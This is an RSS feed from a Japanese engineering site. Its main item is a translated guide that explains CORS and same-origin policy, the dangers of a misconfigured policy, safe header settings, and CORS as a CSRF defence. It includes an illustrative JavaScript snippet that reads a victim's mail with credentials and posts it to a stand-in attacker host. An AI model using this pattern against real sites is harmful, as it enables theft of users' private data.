<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[POSTD | ニジボックスが運営するエンジニアに向けたキュレーションメディア]]></title><description><![CDATA[POSTD は、ニジボックスが運営する、エンジニアに向けたキュレーションメディアです。ニジボックスはWebサービスの企画、制作、開発、運用を一貫して担うリクルートの100%子会社です。 リクルートグループのオンラインサービスをはじめ、様々な業種・業界・業態のサービス開発を行っております。]]></description><link>https://postd.cc</link><generator>GatsbyJS</generator><lastBuildDate>Fri, 24 Jan 2025 02:29:33 GMT</lastBuildDate><language>ja</language><atom:link href="https://postd.cc/feed/" rel="self" type="application/rss+xml"/><image><title>POSTD | ニジボックスが運営するエンジニアに向けたキュレーションメディア</title><link>https://postd.cc</link></image><item><title><![CDATA[CORSガイドの決定版]]></title><description><![CDATA[無垢な仔猫の写真を集めたウェブサイトを訪問したと想像してみてください。かわいい仔猫達の写真の背後には、このウェブサイトの強大な力が隠れています。誰かがウェブサイトにアクセスすると、サイトのオーナーは…]]></description><link>https://postd.cc/cors-the-ultimate-guide/</link><guid isPermaLink="false">https://postd.cc/cors-the-ultimate-guide/</guid><category><![CDATA[開発手法・プロジェクト管理]]></category><category><![CDATA[CORS]]></category><category><![CDATA[Ajax]]></category><pubDate>Fri, 24 Jan 2025 00:00:01 GMT</pubDate><content:encoded><![CDATA[<p>無垢な仔猫の写真を集めたウェブサイトを訪問したと想像してみてください。かわいい仔猫達の写真の背後には、このウェブサイトの強大な力が隠れています。誰かがウェブサイトにアクセスすると、サイトのオーナーはその訪問者のネット上の行動に関するあらゆる情報を入手できます。その中には、銀行取引情報、SNS上の投稿やメッセージ、メール、オンラインの購買データなどが含まれます。あなたが受ける信用面や金銭面の損害はどれほどのものになるでしょうか。あなたのメッセージが流出し、銀行口座のお金が使い込まれるかもしれません。しかし幸いなことに、実際にはそのような状況は起こりません。それは、<a href="https://en.wikipedia.org/wiki/Same-origin_policy">SOP</a>とCORSのお陰なのです。</p>
<h3>目次</h3>
<ol>
<li>Ajax（Asynchronous JavaScript And XML）</li>
<li>インターネットがジャングルではない理由</li>
<li>認証情報を「含める」vs「含めない」</li>
<li>CORSルールの定義</li>
<li>クロスオリジンリクエストの処理
<ol>
<li>リクエストするか否か</li>
<li>アクセスを許可するか拒否するか</li>
<li>CORSポリシーのチェック</li>
</ol>
</li>
<li>CORSポリシーの誤設定による危険</li>
<li>デモ</li>
<li>安全なCORSポリシーを定義する方法</li>
<li>CSRF対策としてのCORS設定</li>
<li>設定ミスで墓穴を掘らない</li>
</ol>
<h2>Ajax（Asynchronous JavaScript And XML）</h2>
<p>少し前の技術になりますが、皆さんがよくご存知の<a href="https://en.wikipedia.org/wiki/Ajax_(programming)">Ajax</a>についてまずお話します。Ajaxとは、ブラウザがバックグラウンドでリクエストを送信できるようにするためのJavaScriptの仕組みです。ウェブサイトのクライアントサイドアプリケーションでは、一般的にAjaxを使用してAPIサーバーに情報をリクエストします。Ajaxはクライアント側で実行されます。つまり、ユーザーがウェブサイトにアクセスする際、ブラウザがAjaxリクエストを送信するということです。この記事では、ボブという名前のインターネットユーザーの事例を検討してみましょう。</p>
<p>example.comというウェブサイトにリクエストを送信する際、Ajaxに「認証情報を使用する」よう伝えることができます。この場合、ブラウザはボブが<code class="language-text">example.com</code>に関するCookieを保存しているかチェックします。保存している場合、ブラウザはAjaxリクエストによりCookieを送信します。ボブがexample.com上で認証されれば、ウェブサイトはボブを認識します。ブラウザはボブのIDでAjaxリクエストを送信します。
<img src="https://www.devsecurely.com/blog/wp-content/uploads/2024/06/exported_image-1-1024x350.png"></p>
<h2>インターネットがジャングルではない理由</h2>
<p>あなたがサイバーセキュリティに熱心であれば、ある疑問が思い浮かんだかもしれません。すなわち、もし自分が悪意のあるウェブサイトを作成したならば、認証情報を<strong>含めて</strong>GmailのウェブサイトにAjaxリクエストを送信し、訪問者のメールをすべて取得すればよいのではないか、という疑問です。</p>
<p>この疑問が浮かんだ方は、悪の才能があるかもしれません。ですが、その企みはうまく行きません。<strong>SOP</strong>と<strong>CORS</strong>という2つの仕組みがあるからです。</p>
<p>SOPはSame Origin Policyの略で、「同一オリジンポリシー」という意味です。この仕組みは、ウェブサイトAがオリジンの異なるウェブサイトBのリソースを読み込めないようにするものです。SOPは、ウェブサイトとサイト上に保存されたユーザーのデータが、悪意のあるウェブサイトによってアクセスされないよう保護します。</p>
<p>CORSはCross-Origin Resource Sharingの略で、「オリジン間リソース共有」という意味です。CORSは、SOPの仕組みに例外を追加できる一連のルールです。SOPのポリシーを緩めることで、ウェブサイトAがオリジンの異なるウェブサイトBからリソースを読み込めるようにします。</p>
<p>ウェブサイトのオリジンは、ドメイン、プロトコルスキーム、ネットワークポートの組み合わせです。2つのURLの間でこれらのいずれかが異なる場合、ブラウザはオリジンが異なるとみなします。<a href="https://www.devsecurely.com/">https://www.devsecurely.com/</a>を例に見てみましょう。このウェブサイトが以下のいずれかのウェブサイトにAjaxリクエストを送信した場合、ブラウザはクロスオリジン（異なるオリジン）とみなします。</p>
<ul>
  <li><span style="color: red; font-weight: bold;">http</span>://www.devsecurely.com/</li>
  <li>https://<span style="color: red; font-weight: bold;">api</span>.devsecurely.com/</li>
  <li>https://www.<span style="color: red; font-weight: bold;">gmail</span>.com/</li>
  <li>https://www.devsecurely.com:<span style="color: red; font-weight: bold;">8443</span>/</li>
</ul>
<p>ウェブサイトがオリジンの異なるURLにHTTPリクエストを送信した場合、このリクエストは<strong>クロスオリジンリクエスト</strong>とみなされます。<strong>同一オリジンリクエスト</strong>とは扱いが異なります。クロスオリジンリクエストの扱い方に関するルールは複雑です。この記事では、すべての要素とルールを見ていきます。準備はいいですか？</p>
<h2>認証情報を「含める」vs「含めない」</h2>
<p>まずは認証情報を使用するか否かでAjaxリクエストにどのような影響があるのか見てみましょう。明確化のため、<code class="language-text">https://hacker.com</code>から<code class="language-text">https://gmail.com</code>にAjaxリクエストを送信する例について検討します。</p>
<p>「認証情報を含める」は、Ajaxで有効化できるオプションです。ブラウザに対し、Gmail上のユーザーのCookieをAjaxリクエストに含めるよう指示します。そうすることで、Gmailはボブのブラウザから送られたリクエストであると分かります。レスポンスには、ボブのGmailアカウントに関連する情報が含まれます。例えば、<code class="language-text">https://gmail.com/emails</code>に対してAjaxリクエストを送ると、レスポンスにはボブのメールが含まれます。</p>
<p>これは危険なシナリオです。どのウェブサイトでもAjaxリクエストを送ることで訪問者のメールを取得することが出来たなら、インターネットは野生のジャングルのようになってしまうでしょう。インターネットプロトコルを設計したエンジニアたちが、そうならないようにしたのです。</p>
<p>一方で、「認証情報を含める」を有効化しなかった場合、AjaxリクエストにはCookieは含まれません。Gmailのウェブサイトは、ボブが別のブラウザタブでGmailアカウントにログインしていたとしても、ボブのブラウザを匿名のユーザーとして扱います。したがって、Ajaxリクエストに対するレスポンスには、一切個人情報は含まれません。</p>
<h2>CORSルールの定義</h2>
<p>ブラウザは、ウェブサイトAからウェブサイトBにAjaxリクエストを送る際、ウェブサイトBのCORSルールを参照し、どのように振る舞うかを判断します。ブラウザが従うCORSルールを定義するのはウェブサーバーBです。これらのルールは、特定のHTTPレスポンスヘッダー内で定義されます。最も重要なヘッダーは<strong>Access-Control-Allow-Origin</strong>と<strong>Access-Control-Allow-Credentials</strong>です。それぞれの役割と取り得る値については後ほど説明します。</p>
<h2>クロスオリジンリクエストの処理</h2>
<p>あるウェブサイトが別のウェブサイトにAjaxリクエストを行った場合（クロスオリジンリクエスト）、ブラウザはCORSポリシーを確認し、Ajaxリクエストの扱い方を判断します。
ブラウザは次の2つについて判断する必要があります。</p>
<ol>
<li>JavaScriptコードで定義されているようにHTTPリクエストを行うべきか？</li>
<li>ブラウザがリクエストを行った場合、JavaScriptコードがレスポンスにアクセスできるようにするべきか？
これら2つのステップを掘り下げて見てみましょう。</li>
</ol>
<h2>リクエストするか否か</h2>
<p>一部のAjaxの設定の仕方によっては、、ブラウザはCORSポリシーをチェックせずにリクエストを行います。そうでない場合は、ブラウザはCORSポリシーをチェックした上でリクエストを行うか否かを判断する必要があります。後者の場合、ブラウザはまずHTTP OPTIONSリクエストをURLに対して行い、CORSポリシーを取得します。これをプリフライトリクエストと言います。</p>
<p>ブラウザがどのようにしてCORSポリシーチェックを行うかは後ほど説明します。ここでは、<a href="https://en.wikipedia.org/wiki/Cross-origin_resource_sharing">ウィキペディア</a>にある以下のデシジョンツリー（決定木）を見てみましょう。ブラウザがリクエストを行う前にCORSポリシーをチェックする際の条件が説明されています。
<img src="https://www.devsecurely.com/blog/wp-content/uploads/2024/06/CORS.png">
CORSチェックなしでブラウザがリクエストを行う条件を以下に挙げます。</p>
<ul>
<li>AjaxリクエストがGETリクエストであり、カスタムHTTPヘッダーがない。</li>
<li>AjaxリクエストがPOSTリクエストであり、標準のContent-Typeで、カスタムHTTPヘッダーがない。</li>
</ul>
<p>ブラウザはなぜCORSポリシーをチェックせずにこれらのリクエストを行うのでしょうか。それは、これらがAjaxを使わずにウェブサイトが実行できるリクエストだからです。</p>
<ul>
<li>カスタムHTTPヘッダーのないGETリクエストは、HTMLのimgタグまたはiframeタグを使用してトリガーできます。src属性の中でターゲットURLを宣言するだけです。ページをレンダリングする際、ブラウザがURLに対して認証情報を含むGETリクエストを行い、リソースを読み込みます。</li>
<li>HTMLのformタグを使用し、カスタムHTTPヘッダーなしで、標準のContent-TypeによりPOSTリクエストをトリガーできます。POST属性はすべてHTMLのinputタグを使用して追加でき、JavaScriptを使用してフォームを送信し、リクエストを実行できます。</li>
</ul>
<p>他のすべてのシナリオでは、ブラウザはプリフライトリクエストを行います。次にCORSポリシーをチェックし、リクエストを送信するか判断します。</p>
<ul>
<li>HTTPのPUT、DELETEまたはその他のリクエスト</li>
<li>HTTPのPOSTリクエストで、application/jsonなど標準以外のContent-Typeを使用</li>
<li>HTTPのGETまたはPOSTリクエストで、X-Requested-With: XMLHttpRequestなどのカスタムHTTPヘッダーを使用</li>
</ul>
<h2>アクセスを許可するか拒否するか</h2>
<p>ブラウザは、Ajaxリクエストを行う場合、JavaScriptコードがレスポンスにアクセスできるようにするか判断する必要があります。ブラウザはレスポンスからCORSポリシーを取得し、AjaxリクエストがCORSポリシーと一致するか確認します。
一致する場合、JavaScriptコードはレスポンスにアクセスできます。一致しない場合、JavaScriptコードはレスポンスにアクセスできず、JavaScriptコンソールにエラーメッセージが表示されます。
次のセクションでは、CORSポリシーのチェックプロセスについて説明します。</p>
<h2>CORSポリシーのチェック</h2>
<p>要約すると、ブラウザは以下の2つのケースでCORSポリシーをチェックします。</p>
<ol>
<li>標準以外のHTTPリクエストを送信する前。</li>
<li>レスポンスへのアクセスを許可するかどうか判断する前。</li>
</ol>
<p>ブラウザは以下の要素をチェックします。</p>
<ul>
<li>ブラウザは<strong>Access-Control-Allow-Origin</strong>レスポンスヘッダーの値を取得します。値はAjaxリクエストを行ったウェブサイトのオリジンと一致しなくてはいけません。オリジンの形式は「schema://fqdn:port」です。
<ul>
<li><strong>Access-Control-Allow-Origin</strong>レスポンスヘッダーがない場合、チェックは失敗します。</li>
<li>実は、<strong>Access-Control-Allow-Origin</strong>ヘッダーにワイルドカード文字の「*」が指定されている場合もチェックは失敗します。</li>
</ul>
</li>
<li>「認証情報を含めて」リクエストを行う場合： <strong>Access-Control-Allow-Credentials</strong>レスポンスヘッダーがあり、値は「true」が設定されている必要があります。</li>
<li>カスタムHTTPヘッダーを1つ以上設定してAjaxリクエストを行う場合：ブラウザは<strong>Access-Control-Allow-Headers</strong>レスポンスヘッダーの値を取得します。このヘッダーの値には、リクエストで使用されたカスタムHTTPヘッダーがすべて含まれている必要があります。</li>
<li>AjaxリクエストタイプがGET、POST、HEADのいずれでもない場合：ブラウザは<strong>Access-Control-Allow-Methods</strong>レスポンスヘッダーの値を取得します。値には、Ajaxクエリによって定義されたHTTPリクエストタイプが含まれている必要があります。</li>
</ul>
<p>これらの条件のいずれかが満たされていない場合、CORSポリシーのチェック全体が失敗して以下の結果となります。
ブラウザがリクエストを行う前にCORSチェックを実行する場合、リクエストを送信しません。
ブラウザがリクエストを行った後でCORSチェックを実行する場合、JavaScriptコードはレスポンスにアクセスできません。</p>
<p>以下の図はCORSのデシジョンツリーをまとめたものです。
<img src="https://www.devsecurely.com/blog/wp-content/uploads/2024/07/recap3-1024x623.png"></p>
<div class="twitter_follow"><span>セキュリティを万全に保ちたい方は、筆者らのXで役に立つ情報やセキュリティニュースのダイジェストを提供しているのでぜひフォローしてください</span><br/><a href="https://twitter.com/devsecurely?ref_src=twsrc%5Etfw" class="twitter-follow-button" data-show-count="false">Follow @Devsecurely</a><script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script><style type="text/css" scoped>.twitter_follow span{font-size:17px;color:#000}.twitter_follow{text-align:center;--style-box-shadow-style-type: ;--style-box-shadow-distance-x:0px;--style-box-shadow-distance-y:0px;--style-box-shadow-blur:36px;--style-box-shadow-spread:4px;--style-box-shadow-color:rgb(0, 0, 0, 0.12);box-shadow:var(--style-box-shadow-style-type) var(--style-box-shadow-distance-x) var(--style-box-shadow-distance-y) var(--style-box-shadow-blur) var(--style-box-shadow-spread) var(--style-box-shadow-color);padding:8px 12px;border-radius:10px;border:1px solid #e7e7e7;background-color:#c0708c4a}.twitter_follow iframe{margin-top:10px}</style></div>
<h2>CORSポリシーの誤設定による危険</h2>
<p>ブラウザのメンテナーがユーザーを保護するためにCORSの仕組みを設計しました。ユーザーがうっかり悪意のあるウェブサイトにアクセスしてしまうかもしれないからです。優れたCORSポリシーは、悪意のあるウェブサイトがユーザーのIDを使ってあなたのウェブサイトにHTTPリクエストを送信できないようにします。</p>
<p>CORSポリシーは、HTTPレスポンスヘッダーを用いて定義されます。したがって、デベロッパーには他のオリジンからの悪意のあるリクエストを防ぐことができる、十分厳格なCORSポリシーを定義することが求められます。</p>
<p>CORSは、Cookie（セッションCookieなど）を使用してユーザー認証を行うウェブサイトに特に関係します。これは、「認証情報を含める」Ajax設定の場合、ブラウザが自動的にCookieをリクエストとともに送信するからです。そうすると、リクエストは正当なユーザーから届いたように見えます。</p>
<p>では、他の認証方法を使用する場合はどうでしょうか。例えば、HTTPの「Authorization」ヘッダーで認証トークンを送信するとします。その場合、CORSポリシーはあまり関係ありません。悪意のあるウェブサイトがAjaxリクエストを行っても、ブラウザはリクエストにトークンを追加しません。そのため、悪意のあるウェブサイトは正規のウェブサイトのローカルストレージにアクセスできません。トークンにアクセスできないため、Ajaxのリクエストに含めることができません。あなたのウェブサイトは、何もせずともこの攻撃シナリオからは保護されます。</p>
<p>Cookieによる認証の場合、CORSポリシーが甘いと悪いことが起こる可能性があります。ユーザーが悪意のあるウェブサイトにアクセスした際、以下のような攻撃シナリオが考えられます。</p>
<ul>
<li>悪意のあるウェブサイトがAjaxリクエストを行い、Gmail上のユーザーのメールを取得します。次にJavaScriptコードがそれらのメールをウェブサイトを作成したハッカーに送ります。</li>
<li>悪意のあるウェブサイトは、Gmailに対して特定のHTTP POSTリクエストを行うことができます。このリクエストはユーザーの設定を変え、ハッカーが被害者であるユーザーの名前でメールを送信できるようにします。
悪意のあるウェブサイトは、Gmailに対して特定のHTTP POSTリクエストを行い、被害者のパスワードを変更することができます。</li>
</ul>
<p>以下のJavaScriptコードのスニペットは、攻撃者がどのようにして被害者のメールを取得し、自分のサーバーに送信するのかを示します。取得したメールはサーバーに保存し、後で参照することができます。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span> <span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'https://gmail.com/emails'</span><span class="token punctuation">)</span>
xhr<span class="token punctuation">.</span>withCredentials <span class="token operator">=</span> <span class="token boolean">true</span>
xhr<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>readyState <span class="token operator">==</span> <span class="token number">4</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>status <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token keyword">var</span> xhr2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
xhr2<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span> <span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'https://hacker.com/save_emails'</span><span class="token punctuation">)</span>
<span class="token keyword">var</span> params <span class="token operator">=</span> <span class="token string">'emails='</span><span class="token operator">+</span>xhttp<span class="token punctuation">.</span>responseText<span class="token punctuation">;</span>
xhr2<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>params<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>以下はこのシナリオをイラストで表したものです。
<img src="https://www.devsecurely.com/blog/wp-content/uploads/2024/06/exported_image2-1024x341.png">
ここで紹介した例は単に説明を目的としたものです。Gmailにはそのような攻撃を防ぐ優れたCORSポリシーがあります。実際に効果を見ていただけるよう、例としてウェブサイトを作成してみました。</p>
<h2>デモ</h2>
<p>この攻撃について説明するため、シンプルで脆弱なウェブサイトを作成しました。このデモサイトは、認証が必要なウェブアプリケーションをシミュレーションします。まず、次のURLにアクセスし、ボタンをクリックしてログインしてください。<a href="https://demo.devsecurely.com/demo_cors">https://demo.devsecurely.com/demo_cors</a></p>
<p>ログインしたら、以下のボタンをクリックしてください。先ほどのURLに対し、認証情報を含めたAjaxリクエストが送信されます。</p>
<p>(※訳注：POSTDでは文章の翻訳のみ掲載しています)</p>
<p>[原文：「攻撃開始」ボタン]</p>
<p>Ajaxリクエストの結果が以下に表示されます。</p>
<p>[原文：結果表示エリア]</p>
<p>手順に従うと、あなたのパブリックIPアドレスが上に表示されるはずです。「攻撃開始」ボタンをクリックしたとき、あなたのブラウザは以下のJavaScriptコードを実行しました。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token keyword">var</span> xhttp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xhttp<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>readyState <span class="token operator">==</span> <span class="token number">4</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>status <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>responseText<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">"Your IP address"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"demo_website_dontent"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>textContent<span class="token operator">=</span><span class="token keyword">this</span><span class="token punctuation">.</span>responseText
<span class="token keyword">else</span>
document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"demo_website_dontent"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>textContent<span class="token operator">=</span><span class="token string">"You need to be authenticated first"</span>
<span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
xhttp<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"https://demo.devsecurely.com/demo_cors"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xhttp<span class="token punctuation">.</span>withCredentials <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
xhttp<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>あなたのブラウザは、HTTPリクエストを直接実行するか、プリフライトリクエストを実行し、CORSポリシーをチェックするかを判断する必要がありました。これは単純なGETリクエストで、カスタムHTTPヘッダーもないのでブラウザは直接リクエストを行いました。こちらが、あなたのブラウザが送信した生のHTTPリクエストです。</p>
<p><img src="https://www.devsecurely.com/blog/wp-content/uploads/2024/06/request1.png"></p>
<p>これに対し、脆弱なウェブサイトは以下のレスポンスを送り返しました。</p>
<p><img src="https://www.devsecurely.com/blog/wp-content/uploads/2024/06/response1.png"></p>
<p>次に、ブラウザはJavaScriptコードがレスポンスにアクセスできるようにするかを判断する必要がありました。したがって、CORSポリシーのチェックを行いました。4つの条件をすべて見てみましょう。</p>
<ul>
<li>Access-Control-Allow-Originヘッダーの値には「 <a href="https://www.devsecurely.com">https://www.devsecurely.com</a> 」が設定されています。これは、Ajaxリクエストを行ったのと同じオリジンです。✅</li>
<li>リクエストは認証情報ありで行い、レスポンスにはAccess-Control-Allow-Credentialsヘッダーが存在し、値は「true」です。✅</li>
<li>リクエストはカスタムHTTPヘッダーを使用していません。そのため、ブラウザはAccess-Control-Allow-Headersヘッダーをチェックしません。✅</li>
<li>リクエストはGETリクエストを実行します。そのため、ブラウザはAccess-Control-Allow-Methodsヘッダーをチェックしません。✅</li>
</ul>
<p>CORSのチェックはすべて成功しました。したがって、ブラウザはJavaScriptがレスポンスにアクセスするのを許可します。これにより、このブログが脆弱なウェブサイト上にあるあなたの個人データにアクセスすることが可能になります。</p>
<h2>安全なCORSポリシーを定義する方法</h2>
<p>CORSポリシーは、特定のHTTPレスポンスヘッダーによって定義されます。各ヘッダーについて、値が十分に厳格であり、悪意のある活動を防げることを確認する必要があります。また、ポリシーが正当なリクエストをブロックしないようにする必要もあります。各レスポンスヘッダーの値を定義しましょう。</p>
<ul>
<li><strong>Access-Control-Allow-Origin</strong>：このヘッダーの値は、ウェブサイトの呼び出しを許可されたオリジンでなくてはいけません。例えば、<code class="language-text">https://api.example.com</code>にホストされたAPIがあり、そのAPIを呼び出す、<code class="language-text">https://www.example.com</code>にホストされたクライアントサイドアプリケーションがあるとします。このシナリオでは、<strong>Access-Control-Allow-Origin</strong>ヘッダーには常に<code class="language-text">https://www.example.com</code>が値として設定されている必要があります。
<ul>
<li>複数のウェブサイトがあなたのウェブサイトを呼び出せるようにする必要がある場合、許可されたウェブサイトのホワイトリストを定義する必要があります。すべてのリクエストに対して、<strong>Origin</strong>リクエストヘッダーにホワイトリスト上のオリジンが含まれているかどうか確認します。
<ul>
<li>含まれている場合、<strong>Origin</strong>リクエストヘッダーの値を<strong>Access-Control-Allow-Origin</strong>レスポンスヘッダーの値として返します。</li>
<li>含まれていない場合、<strong>Access-Control-Allow-Origin</strong>ヘッダーのデフォルト値を返します。</li>
</ul>
</li>
<li>他のオリジンがあなたのウェブサイトを呼び出せるべきでない場合（例えば、ウェブサイト全体が<code class="language-text">https://www.example.com</code>にホストされている場合など）、このヘッダーは定義しません。</li>
</ul>
</li>
<li><strong>Access-Control-Allow-Credentials</strong>：あなたのウェブサイトがCookie（セッションCookieなど）を使用してユーザーを認証する場合、このヘッダーの値は「true」に設定します。
<ul>
<li>他のオリジンがあなたのウェブサイトを呼び出せるべきでない場合、このヘッダーは定義しません。</li>
</ul>
</li>
<li><strong>Access-Control-Allow-Headers</strong>：リクエストにカスタムHTTPヘッダーを含める必要がある場合、このレスポンスヘッダーに追加してください。複数のHTTPヘッダーが必要な場合、カンマ区切りリストとして追加してください。
<ul>
<li>他のオリジンがあなたのウェブサイトを呼び出せるべきでない場合、このヘッダーは定義しません。</li>
</ul>
</li>
<li><strong>Access-Control-Allow-Methods</strong>：<strong>あなたのウェブサイトがPUTまたはDELETE HTTPメソッドを扱う場合、このヘッダーにカンマ区切りリストとして追加してください</strong>。
<ul>
<li>他のオリジンがあなたのウェブサイトを呼び出せるべきでない場合、このヘッダーは定義しません。</li>
</ul>
</li>
</ul>
<p>プリフライトリクエスト（HTTP OPTIONSリクエスト）を受け取った場合、レスポンスヘッダーのみを返し、それ以外の処理は行わないようにする必要があります。</p>
<p>また、これらの変更は徐々に行ってください。各変更を行った後、ウェブサイトが正常に動作していることを確認してください。CORSの設定を厳しくしすぎると、あなたのAPI／ウェブサイト（ウェブサイトのクライアントサイドアプリケーションなど）を呼び出すクライアント側で問題が発生する可能性があります。</p>
<h2>CSRF対策としてのCORS設定</h2>
<p>先ほど説明したように、ブラウザはCORSポリシーをチェックすることなくリクエストを実行する場合があります。これは、アプリケーションのコンテキストによっては望ましくない可能性があります。</p>
<p>例えば、データを変更するGET APIコントローラーがあるとします。これは、CSRFと呼ばれる攻撃につながる可能性があります。この記事では、このタイプの脆弱性についての詳細な説明は省きますが、この問題についてより具体的に検討するために例を挙げたいと思います。</p>
<p>APIエンドポイントとして<code class="language-text">https://api.example.com/users/delete/[ID]</code>があるとします。このエンドポイントに対してGETリクエストを行うと、[ID]をIDとするユーザーがデータベースから削除されます。悪意のあるウェブサイトはこれを悪用する可能性があります。先ほどのURLに対し、認証情報を含めたAjaxリクエストを行うことができます。<code class="language-text">example.com</code>の管理者がその悪意のあるウェブサイトにアクセスすると、Ajaxリクエストが実行され、ユーザーが削除されます。</p>
<p>こうした攻撃を防ぐための回避策として、CORSチェックを使用できます。そのためには、<strong>リクエストを行う前に</strong>CORSチェックを強制する必要があります。GETリクエストの場合、それを行う唯一の方法はカスタムHTTPヘッダーを追加することです。以下に手順を示します。</p>
<ol>
<li>クライアントサイドアプリケーションで、該当するリクエストにカスタムHTTPヘッダーを追加します（あなたのAPIに対して行われるすべてのリクエストにこのヘッダーを追加してもいいかもしれません）。ヘッダーの名前と値は任意で構いません。ここでは例として「X-Requested-With: XMLHttpRequest」をヘッダーとします。</li>
<li>API側では、新しいヘッダー（X-Requested-With）が各リクエストに存在することを必ず確認するような設定にします。存在しない場合はリクエストを中断し、エラーメッセージを返します。</li>
</ol>
<p>先ほどのように悪意のあるウェブサイトがユーザーを削除したい場合、AjaxリクエストにカスタムHTTPヘッダーとして<strong>X-Requested-With</strong>を追加する必要があります。そうすることで、あなたのAPIサーバーに対してプリフライトリクエストがトリガーされます。あなたのCORSポリシーが最適な方法で定義されていれば、<strong>Access-Control-Allow-Origin</strong>レスポンスヘッダーに悪意のあるウェブサイトの名前は含まれません。したがって、CORSチェックは失敗し、ブラウザはリクエストを実行しません。</p>
<p>このトリックは、GETとPOST両方のエンドポイントをCSRF攻撃から守ることができます。</p>
<p><strong>ちなみに、GETリクエストを使用してアプリケーションに変更を加えるのは避けるべきです。GETはあくまでもデータを取得するためだけに使用するべきであり、データを変更するために使用するべきではありません</strong>。</p>
<h2>設定ミスで墓穴を掘らない</h2>
<p>SOPの仕組みは、最初からクロスオリジンリクエストを防ぐようになっています。したがって、脆弱なCORSポリシーを定義することで自らのウェブサイトを危険な状態に晒すことのないようにしましょう。</p>
<p>アプリケーションの機密性の高さによっては、CORSの設定ミスにより壊滅的な被害を受ける可能性があります。数年前、ある取引プラットフォームの侵入テストを行った際、ウェブサイトのCORSポリシーが非常に甘いことに気づきました。リスクを示すため、サイトの訪問者に特定の株を強制的に買わせる悪意のあるウェブサイトを作成しました。攻撃者はこれを使って顧客に特定の株を強制的に買わせることで、株価を吊り上げることができます。この問題をうまく悪用すれば、億万長者になれます。</p>
<p>犯罪は割りに合わないと言う人たちは、きっとCORSを理解していないのでしょう。</p>
<p>タグ付けされた記事：<a href="https://www.devsecurely.com/blog/tag/checklist">checklist</a>, <a href="https://www.devsecurely.com/blog/tag/cors">CORS</a>, <a href="https://www.devsecurely.com/blog/tag/web-application-security">web application security</a></p>]]></content:encoded></item><item><title><![CDATA[進化した正規表現：JavaScriptの正規表現の歴史と未来]]></title><description><![CDATA[クイックサマリー：以前は、JavaScriptの正規表現は他の言語の正規表現に比べてパフォーマンスが劣っていたものの、近年改良が重ねられ、他の言語に見劣りしなくなっています。この記事では、Steve…]]></description><link>https://postd.cc/history-future-regular-expressions-javascript/</link><guid isPermaLink="false">https://postd.cc/history-future-regular-expressions-javascript/</guid><category><![CDATA[開発手法・プロジェクト管理]]></category><category><![CDATA[JavaScript]]></category><category><![CDATA[正規表現]]></category><pubDate>Thu, 12 Dec 2024 00:00:01 